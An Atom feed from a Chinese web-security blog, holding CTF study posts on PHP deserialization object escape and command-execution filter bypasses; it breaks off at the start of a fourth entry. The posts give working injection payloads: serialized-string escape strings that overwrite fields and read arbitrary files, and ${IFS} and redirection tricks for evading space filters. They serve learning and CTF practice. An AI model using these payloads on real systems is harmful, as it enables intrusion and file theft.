<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0clickjacking0.github.io/"/>
  <updated>2019-12-18T13:48:22.052Z</updated>
  <id>http://0clickjacking0.github.io/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php反序列化中的对象逃逸</title>
    <link href="http://0clickjacking0.github.io/2019/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/"/>
    <id>http://0clickjacking0.github.io/2019/12/17/php反序列化中的对象逃逸/</id>
    <published>2019-12-17T08:15:08.000Z</published>
    <updated>2019-12-18T13:48:22.052Z</updated>
    
    <content type="html"><![CDATA[<p>php反序列化中的对象逃逸的学习</p><a id="more"></a><h1 id="php中的几个特性"><a href="#php中的几个特性" class="headerlink" title="php中的几个特性"></a>php中的几个特性</h1><ol><li>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape1.png" alt></p><ol start="2"><li>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</li><li>对于类似这种<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;s:1:&quot;b&quot;;s:9:&quot;xianyu123&quot;;}s:1:&quot;c&quot;;s:2:&quot;yes&quot;;</code>也是能够正常反序列化的，即使<code>s:2:&quot;yes&quot;</code>的长度不匹配也不影响。说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块。</li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape2.png" alt></p><h1 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h1><p>序列化的字符串在经过过滤函数不正确的处理而导致对象注入，因为先进行了序列化，再进行过滤，那么就有可能会产生此漏洞。</p><h1 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h1><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">'bb'</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'user'</span>];</span><br><span class="line">$password = <span class="string">"mypass"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的<code>user</code>参数可控，我们先给出payload：<code>xianyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}</code></p><p>代码第4行，是把<code>c</code>替换成两个<code>b</code>，这样的话每有一个<code>c</code>，就可以多出1个字符，然后我们的核心代码是<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code>，长度为20，然后我们只需要构造20个<code>c</code>即可。</p><p><img src="http://images.xianyu123.club/php_serialize_escape4.png" alt></p><p>这样的话就可以覆盖掉本来的<code>$password = &quot;mypass&quot;;</code>，替换成了我们自己想要的密码。</p><p><img src="http://images.xianyu123.club/php_serialize_escape3.png" alt></p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>这里模拟一个环境，就是如何覆盖掉<code>$account[&#39;g&#39;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$account = [];</span><br><span class="line">$account[<span class="string">'u'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">$account[<span class="string">'p'</span>] = <span class="string">'pass'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line">$account[<span class="string">'g'</span>] = <span class="string">'g7bk'</span>;</span><br><span class="line">var_dump(serialize($account));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($account));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>先给出payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?account[u]=cccccccccccccccccccccccccccccccccccccccc&amp;account[p]=";s:1:"m";s:9:"xianyu123";s:1:"h";s:4:"hhhh";s:1:"g";s:4:"kkkk";&#125;</span><br></pre></td></tr></table></figure><p>首先我们先不要看过滤的代码</p><p>正常情况下的序列化结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">"cccccccccccccccccccccccccccccccccccccccc"</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>经过过滤函数后的序列化结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到<code>u</code>的长度虽然为40，但是已经没有了内容，所以反序列化会自动往后读取40位</p><p><img src="http://images.xianyu123.club/php_serialize_escape6.png" alt></p><p>会读取到上图的位置，然后结束。因为<code>u</code>的序列化内容读取数据时需要往后填充40位，导致后面的<code>p</code>的内容也发生了改变，吞掉了其双引号，所以此时后面的<code>&quot;;s:1:&quot;g&quot;;s:4:&quot;g7bk&quot;;}</code>在反序列化时就会被当作非法字符忽略掉，导致我们可以控制<code>$account[&#39;g&#39;]</code>的值。</p><p><img src="http://images.xianyu123.club/php_serialize_escape5.png" alt></p><h1 id="实际中的案例分析"><a href="#实际中的案例分析" class="headerlink" title="实际中的案例分析"></a>实际中的案例分析</h1><p>joomla3.0.0-3.4.6 对象注入导致的反序列化</p><h1 id="CTF中的利用"><a href="#CTF中的利用" class="headerlink" title="CTF中的利用"></a>CTF中的利用</h1><p>安洵杯2019-easy_serialize_php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方法和上面的demo2类似，这里就不再重复了，原理就是利用过滤为空让反序列化会自动往后读取，然后可以对<code>$_SESSION[&#39;img&#39;]</code>进行控制，进而可以任意文件读取</p><p>payload：</p><p>读取hint提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.cnblogs.com/wfzWebSecuity/p/11876441.html" target="_blank" rel="noopener">PHP字符逃逸导致的对象注入</a></li><li><a href="https://www.cnblogs.com/peri0d/p/11845917.html" target="_blank" rel="noopener">详解PHP反序列化中的字符逃逸</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php反序列化中的对象逃逸的学习&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php中escapeshellarg和escapeshellcmd的绕过</title>
    <link href="http://0clickjacking0.github.io/2019/12/13/php%E4%B8%ADescapeshellarg%E5%92%8Cescapeshellcmd%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <id>http://0clickjacking0.github.io/2019/12/13/php中escapeshellarg和escapeshellcmd的绕过/</id>
    <published>2019-12-13T12:03:44.000Z</published>
    <updated>2019-12-13T13:04:20.241Z</updated>
    
    <content type="html"><![CDATA[<p>php中escapeshellarg和escapeshellcmd的绕过的学习</p><a id="more"></a><h1 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php中escapeshellarg和escapeshellcmd的绕过的学习&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>命令执行bypass的总结</title>
    <link href="http://0clickjacking0.github.io/2019/12/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/12/11/命令执行bypass的总结/</id>
    <published>2019-12-11T02:17:37.000Z</published>
    <updated>2019-12-12T05:43:24.540Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行bypass的总结</p><a id="more"></a><h1 id="关于文件读取的命令"><a href="#关于文件读取的命令" class="headerlink" title="关于文件读取的命令"></a>关于文件读取的命令</h1><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p><strong>cat命令</strong>连接文件并打印到标准输出设备上，cat经常用来显示文件的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p><strong>tac命令</strong>用于将文件已行为单位的反序输出，即第一行最后显示，最后一行先显示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tac 1.txt</span></span><br><span class="line">666</span><br><span class="line">555</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p><strong>head命令</strong>用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># head 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><strong>tail命令</strong>用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt 2.txt</span></span><br><span class="line">==&gt; 1.txt &lt;==</span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line">==&gt; 2.txt &lt;==</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br></pre></td></tr></table></figure><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p><strong>more命令</strong>是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># more 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="less-在docker中可能不存在这个命令"><a href="#less-在docker中可能不存在这个命令" class="headerlink" title="less(在docker中可能不存在这个命令)"></a>less(在docker中可能不存在这个命令)</h2><p><strong>less命令</strong>的作用与<a href="http://man.linuxde.net/more" target="_blank" rel="noopener">more</a>十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">less 1.txt</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p><strong>nl命令</strong>读取 <a href="http://man.linuxde.net/file" target="_blank" rel="noopener">file</a> 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。在输出中，nl命令根据您在命令行中指定的标志来计算左边的行。输入文本必须写在逻辑页中。每个逻辑页有头、主体和页脚节（可以有空节）。除非使用<code>-p</code>选项，nl 命令在每个逻辑页开始的地方重新设置行号。可以单独为头、主体和页脚节设置行计算标志（例如，头和页脚行可以被计算然而文本行不能）。其默认的结果与<code>cat -n</code>有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐0等等的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># nl 1.txt</span></span><br><span class="line">     1123456</span><br><span class="line">     2555</span><br><span class="line">     3666</span><br></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>从指定的文件file中读取数据，编码为base64字符串输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base64 1.txt</span></span><br><span class="line">MTIzNDU2CjU1NQo2NjYK</span><br></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>从指定的文件file中读取数据，编码为base32字符串输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base32 1.txt</span></span><br><span class="line">GEZDGNBVGYFDKNJVBI3DMNQK</span><br></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p><strong>strings命令</strong>在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># strings 1.txt</span></span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><strong>sort命令</strong>是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9423a7551563:/<span class="comment"># sort 1.txt</span></span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p><strong>od命令</strong>用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># od 1.txt</span></span><br><span class="line">0000000 031061 032063 033065 032412 032465 033012 033066 000012</span><br><span class="line">0000017</span><br></pre></td></tr></table></figure><h2 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h2><p><strong>cut命令</strong>用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的<a href="http://man.linuxde.net/type" target="_blank" rel="noopener">type</a>命令。</p><h3 id="cut选项说明："><a href="#cut选项说明：" class="headerlink" title="cut选项说明："></a>cut选项说明：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项-b，以字节为单位进行分割，-b支持形如3-5的写法，而且多个定位之间用逗号隔开就成了,比如想提取第3，第4、第5和第8个字节，命令为 -b 3-5,8</span><br><span class="line"></span><br><span class="line">选项-c，以字符为单位进行分割。用法与-b类似</span><br><span class="line"></span><br><span class="line">选项-f，后面跟列号，比如-f 1，表示读取第一列的信息</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cut -b 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -f 1 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -c 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br></pre></td></tr></table></figure><h2 id="hexdump-在docker中可能不存在这个命令"><a href="#hexdump-在docker中可能不存在这个命令" class="headerlink" title="hexdump(在docker中可能不存在这个命令)"></a>hexdump(在docker中可能不存在这个命令)</h2><p><strong>hexdump命令</strong>一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ hexdump 1.txt</span><br><span class="line">0000000 6568 6c6c 206f 6978 6e61 7579 3231 2133</span><br><span class="line">0000010 000a</span><br><span class="line">0000011</span><br></pre></td></tr></table></figure><h2 id="xxd-在docker中可能不存在这个命令"><a href="#xxd-在docker中可能不存在这个命令" class="headerlink" title="xxd(在docker中可能不存在这个命令)"></a>xxd(在docker中可能不存在这个命令)</h2><p><strong>xxd能将一个给定文件或标准输入转换为十六进制形式，也能将十六进制转换回二进制形式。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ xxd 1.txt</span><br><span class="line">00000000: 6865 6c6c 6f20 7869 616e 7975 3132 3321  hello xianyu123!</span><br><span class="line">00000010: 0a</span><br></pre></td></tr></table></figure><h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="方法1：-IFS"><a href="#方法1：-IFS" class="headerlink" title="方法1：${IFS}"></a>方法1：${IFS}</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$&#123;IFS&#125;</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span><span class="variable">$9</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><h2 id="方法2：重定向符-lt-gt"><a href="#方法2：重定向符-lt-gt" class="headerlink" title="方法2：重定向符&lt;&gt;"></a>方法2：重定向符&lt;&gt;</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;&gt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行bypass的总结&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Upload-labs解题笔记</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/Upload-labs%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/Upload-labs解题笔记/</id>
    <published>2019-11-27T11:56:44.000Z</published>
    <updated>2019-11-27T11:58:28.403Z</updated>
    
